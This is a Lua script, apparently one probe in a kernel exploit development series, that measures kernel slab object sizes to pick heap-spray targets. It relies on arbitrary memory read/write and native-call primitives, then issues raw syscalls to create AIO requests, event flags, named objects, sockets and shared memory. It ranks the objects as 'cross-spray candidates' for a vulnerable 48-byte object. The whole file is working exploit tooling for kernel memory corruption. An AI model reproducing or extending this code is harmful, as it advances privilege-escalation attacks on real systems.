-- CRASH_CLASS: LOW
-- PROBE 69h: Zone size mapping for spray target selection
--
-- Measures kernel allocation sizes for candidate spray objects by watching
-- sys 624 (VM op counter, +5 per mmap, zero jitter). When enough slab
-- objects fill a page, 624 increments. Count objects between increments:
-- objects_per_page = count_between_jumps, object_size = 16384 / count.
--
-- Compares measured sizes against R's 48B → 64B UMA bucket.
-- Objects matching 64B are viable cross-subsystem spray candidates.
--
-- DOES NOT call 670 (aio_init).

print("=== PROBE 69h: ZONE SIZE MAPPING ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local function get_624()
    local v = nil
    pcall(function() v = mk(624)(uint64(0)) end)
    return v and N(v) or 0
end

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local data_buf = memory.alloc(0x1000)
local reqs = memory.alloc(0x30)

-- AIO submit helper
local function aio_submit_one()
    local id_out = memory.alloc(8); wd(N(id_out), 0)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    wq(N(reqs) + 0x10, uint64(N(data_buf)))
    wq(N(reqs) + 0x18, uint64(N(memory.alloc(8))))
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    pcall(function() mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(id_out))) end)
    return rd(N(id_out)) or 0
end

local function aio_poll(id)
    local b = memory.alloc(8); wd(N(b), id)
    local s = memory.alloc(8); wd(N(s), 0xDEAD)
    pcall(function() mk(664)(uint64(N(b)), uint64(1), uint64(N(s))) end)
end

local function aio_delete(id)
    local b = memory.alloc(8); wd(N(b), id)
    local s = memory.alloc(8)
    pcall(function() mk(662)(uint64(N(b)), uint64(1), uint64(N(s))) end)
end

local results = {}

-- ============================================================
-- [A] AIO R object size (directly measures R's zone)
-- ============================================================
print("[A] AIO R-object zone (submit 500)")

if alive() then
    local COUNT = 500
    local pre = get_624()
    local ids = {}
    for i = 1, COUNT do
        if not alive() then break end
        local id = aio_submit_one()
        if id ~= 0 then table.insert(ids, id) end
    end
    local post = get_624()
    local delta = post - pre
    print(string.format("  submitted %d, 624 delta=%d", #ids, delta))
    if delta > 0 then
        local per_obj = delta / #ids
        print(string.format("  per-submit delta=%.3f", per_obj))
        if per_obj > 0.01 then
            local est = math.floor(16384 * per_obj / 5 + 0.5)
            print(string.format("  estimated R allocation: ~%d bytes per page alloc", est))
        end
    end
    table.insert(results, {name="AIO_R", count=#ids, delta=delta})

    -- Cleanup
    for _, id in ipairs(ids) do aio_poll(id); aio_delete(id) end
end

if not alive() then print("DEAD after [A]"); return end

-- ============================================================
-- [B] EVF object size (538 create, 539 delete)
-- ============================================================
print("")
print("[B] EVF zone (create 500)")

if alive() then
    local COUNT = 500
    local pre = get_624()
    local handles = {}
    for i = 1, COUNT do
        if not alive() then break end
        local name = put_str(string.format("z%04d", i))
        local h = nil
        pcall(function() h = mk(538)(uint64(N(name)), uint64(i)) end)
        if h then
            local hv = N(h)
            if hv > 0 and hv ~= 0xFFFFFFFF then table.insert(handles, hv) end
        end
    end
    local post = get_624()
    local delta = post - pre
    print(string.format("  created %d EVF, 624 delta=%d", #handles, delta))
    if delta > 0 and #handles > 0 then
        print(string.format("  per-evf delta=%.3f", delta / #handles))
    end
    table.insert(results, {name="EVF", count=#handles, delta=delta})

    for _, eh in ipairs(handles) do pcall(function() mk(539)(uint64(eh)) end) end
end

if not alive() then print("DEAD after [B]"); return end

-- ============================================================
-- [C] Namedobj object size (557 create, 558 delete)
-- ============================================================
print("")
print("[C] Namedobj zone (create 500)")

if alive() then
    local COUNT = 500
    local pre = get_624()
    local handles = {}
    for i = 1, COUNT do
        if not alive() then break end
        local name = put_str(string.format("n%04d", i))
        local h = nil
        pcall(function() h = mk(557)(uint64(N(name))) end)
        if h then
            local hv = N(h)
            if hv > 0 and hv ~= 0xFFFFFFFF then table.insert(handles, hv) end
        end
    end
    local post = get_624()
    local delta = post - pre
    print(string.format("  created %d namedobj, 624 delta=%d", #handles, delta))
    if delta > 0 and #handles > 0 then
        print(string.format("  per-namedobj delta=%.3f", delta / #handles))
    end
    table.insert(results, {name="NAMEDOBJ", count=#handles, delta=delta})

    for _, nh in ipairs(handles) do pcall(function() mk(558)(uint64(nh)) end) end
end

if not alive() then print("DEAD after [C]"); return end

-- ============================================================
-- [D] UDP socket zone (97 create, 6 close)
-- ============================================================
print("")
print("[D] UDP socket zone (create 300)")

if alive() then
    local COUNT = 300
    local pre = get_624()
    local fds = {}
    for i = 1, COUNT do
        if not alive() then break end
        local fd = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
        if fd >= 0 then table.insert(fds, fd) end
    end
    local post = get_624()
    local delta = post - pre
    print(string.format("  created %d sockets, 624 delta=%d", #fds, delta))
    if delta > 0 and #fds > 0 then
        print(string.format("  per-socket delta=%.3f", delta / #fds))
    end
    table.insert(results, {name="UDP_SOCKET", count=#fds, delta=delta})

    for _, fd in ipairs(fds) do pcall(function() mk(6)(uint64(fd)) end) end
end

if not alive() then print("DEAD after [D]"); return end

-- ============================================================
-- [E] Socketpair zone (135 create)
-- ============================================================
print("")
print("[E] Socketpair zone (create 200 pairs)")

if alive() then
    local COUNT = 200
    local pre = get_624()
    local fds = {}
    local sp_buf = memory.alloc(16)
    for i = 1, COUNT do
        if not alive() then break end
        wd(N(sp_buf), 0xFFFFFFFF); wd(N(sp_buf) + 4, 0xFFFFFFFF)
        pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf))) end)
        local f0 = rd(N(sp_buf)) or -1
        local f1 = rd(N(sp_buf) + 4) or -1
        if f0 >= 0 then table.insert(fds, f0) end
        if f1 >= 0 then table.insert(fds, f1) end
    end
    local post = get_624()
    local delta = post - pre
    print(string.format("  created %d fds (%d pairs), 624 delta=%d",
        #fds, COUNT, delta))
    if delta > 0 and #fds > 0 then
        print(string.format("  per-fd delta=%.3f", delta / #fds))
    end
    table.insert(results, {name="SOCKETPAIR", count=#fds, delta=delta})

    for _, fd in ipairs(fds) do pcall(function() mk(6)(uint64(fd)) end) end
end

if not alive() then print("DEAD after [E]"); return end

-- ============================================================
-- [F] IP_OPTIONS setsockopt zone
-- ============================================================
print("")
print("[F] IP_OPTIONS zone (200 sockets + setsockopt)")

if alive() then
    local COUNT = 200
    local opt = memory.alloc(48)
    for i = 0, 36, 4 do wd(N(opt) + i, 0x41414141) end

    -- Test if IP_OPTIONS works at all
    local test_fd = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
    local ipopts_work = false
    if test_fd >= 0 then
        local r = -999
        pcall(function()
            r = sgn(mk(54)(uint64(test_fd), uint64(0), uint64(1), uint64(N(opt)), uint64(40)))
        end)
        ipopts_work = (r == 0)
        pcall(function() mk(6)(uint64(test_fd)) end)
        print(string.format("  IP_OPTIONS test: ret=%d (%s)", r, ipopts_work and "OK" or "FAIL"))
    end

    if ipopts_work then
        local pre = get_624()
        local fds = {}
        for i = 1, COUNT do
            if not alive() then break end
            local fd = sgn(mk(97)(uint64(2), uint64(2), uint64(17)))
            if fd >= 0 then
                table.insert(fds, fd)
                pcall(function()
                    mk(54)(uint64(fd), uint64(0), uint64(1), uint64(N(opt)), uint64(40))
                end)
            end
        end
        local post = get_624()
        local delta = post - pre
        print(string.format("  created %d sockets+opts, 624 delta=%d", #fds, delta))
        if delta > 0 and #fds > 0 then
            print(string.format("  per-socket+opt delta=%.3f", delta / #fds))
        end
        table.insert(results, {name="IP_OPTIONS", count=#fds, delta=delta})

        for _, fd in ipairs(fds) do pcall(function() mk(6)(uint64(fd)) end) end
    else
        print("  IP_OPTIONS not available — skipping")
        table.insert(results, {name="IP_OPTIONS", count=0, delta=0})
    end
end

if not alive() then print("DEAD after [F]"); return end

-- ============================================================
-- [G] SHM zone (482 create)
-- ============================================================
print("")
print("[G] SHM zone (create 100)")

if alive() then
    local COUNT = 100
    local pre = get_624()
    local shm_fds = {}
    for i = 1, COUNT do
        if not alive() then break end
        local name = put_str(string.format("/shm%04d", i))
        local fd = nil
        pcall(function()
            fd = mk(482)(uint64(N(name)), uint64(0x202), uint64(0x1B6))
        end)
        if fd then
            local fv = sgn(fd)
            if fv >= 0 then table.insert(shm_fds, fv) end
        end
    end
    local post = get_624()
    local delta = post - pre
    print(string.format("  created %d shm, 624 delta=%d", #shm_fds, delta))
    if delta > 0 and #shm_fds > 0 then
        print(string.format("  per-shm delta=%.3f", delta / #shm_fds))
    end
    table.insert(results, {name="SHM", count=#shm_fds, delta=delta})

    for _, fd in ipairs(shm_fds) do pcall(function() mk(6)(uint64(fd)) end) end
end

if not alive() then print("DEAD after [G]"); return end

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print("=== ZONE SIZE SUMMARY ===")
print(string.format("%-15s %6s %6s %10s %10s", "Object", "Count", "Delta", "Per-obj", "Est.size"))

for _, r in ipairs(results) do
    local per = r.count > 0 and r.delta / r.count or 0
    local est = ""
    if per > 0.01 then
        -- 624 delta=5 per page allocation; page=16384 bytes
        -- If per_obj = 5/N, then N objects per page, size = 16384/N
        -- per_obj = delta/count; if every 256 objects cause delta=5, then
        -- 256 objects per page -> 64B each
        -- Actually: delta = (count / objects_per_page) * 5
        -- objects_per_page = count * 5 / delta
        -- size = 16384 / objects_per_page = 16384 * delta / (count * 5)
        local obj_size = 16384 * r.delta / (r.count * 5)
        est = string.format("~%dB", math.floor(obj_size + 0.5))
    end
    print(string.format("%-15s %6d %6d %10.3f %10s", r.name, r.count, r.delta, per, est))
end

print("")
print("R target: 48B -> 64B UMA bucket")
print("Objects with est.size near 64B are cross-spray candidates")

print("")
print("=== PROBE 69h COMPLETE ===")
